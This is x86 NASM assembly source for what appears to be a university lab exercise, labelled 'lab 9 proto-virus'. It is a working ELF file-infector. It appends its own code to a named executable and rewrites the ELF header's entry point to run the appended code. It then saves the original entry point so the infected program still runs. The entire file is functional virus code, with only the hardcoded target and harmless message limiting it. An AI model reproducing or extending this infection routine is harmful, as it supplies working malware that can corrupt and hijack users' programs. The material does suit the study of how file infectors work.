%define stdin 0
%define stdout 1
%define stderr 2
%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start
	section .text
_start:
        push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
	
	;printing the virus statement
        call get_my_loc
        sub ecx, next_i-OutStr ; ecx now contain the address of print format
	write stdout,ecx,32

	
	;open the file to be infect
        call get_my_loc
        sub ecx, next_i-FileName
        mov dword[ebp-4],ecx; filename pointer
        mov ebx,ecx
        open ebx,RDWR,0x700
        
        ;error check
        cmp eax,0
        je FailExit
        
        ;keep file desc on stack
        mov dword [ebp-8],eax ;file desc
        
        ;find and save file's size on stack 
        lseek eax,0,SEEK_END
        mov dword[ebp-12],eax ; the size of the file in bytes
        
        ;find start and end address and write the in the end of infected file
        call get_my_loc
        mov ebx,ecx
        sub ecx, next_i-_start
        mov esi, ecx
        sub ebx, next_i-virus_end
        sub ecx,ebx
        neg ecx
        mov eax,dword[ebp-8]
        write eax,esi,ecx
        mov eax,dword[ebp-8]
        lseek eax,0,SEEK_SET; back to begining of file after write/read
        
        ;read the elf header file into stack
        mov eax,dword[ebp-8] 
        mov ebx,ebp
        sub ebx,68
        read eax,ebx,52
        mov eax,dword[ebp-8]
        lseek eax,0,SEEK_SET; back to begining of file after write/read
        
        mov edx,dword[ebp-44]
        mov dword[ebp-72],edx; keep previous entry point on stack
        
        
        mov esi,dword[ebp-12] 
        add esi,0x08048000 ; get virus's entry point
        mov dword[ebp-44],esi; change it on stack
        
        mov eax,dword[ebp-8]
        mov ebx,ebp
        sub ebx,68
        write eax,ebx,52;  write the change into file
        mov eax,dword[ebp-8]
        lseek eax,0,SEEK_SET ; back to begining of file after write/read
        
        
       
        
        
        
;write the old entry point after the virus code, 4 bytes before the end.

        xor ecx,ecx
        mov eax,dword[ebp-8]
	lseek eax, -4, SEEK_END ; 
	mov ecx,ebp
	sub ecx,72
        mov eax,dword[ebp-8]
	write eax,ecx,4 

        mov ebx,dword[ebp-8]; closing file
        close ebx
        
        
        call get_my_loc
        sub ecx, next_i-PreviousEntryPoint
        call [ecx]
VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

                         
FailExit:
    call get_my_loc
    sub ecx, next_i-Failstr
    write stdout,ecx,18
    exit -1
                         
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "problem with file", 10 , 0
	
get_my_loc:
	call next_i
next_i:
	pop ecx
	ret

PreviousEntryPoint: dd VirusExit
virus_end:


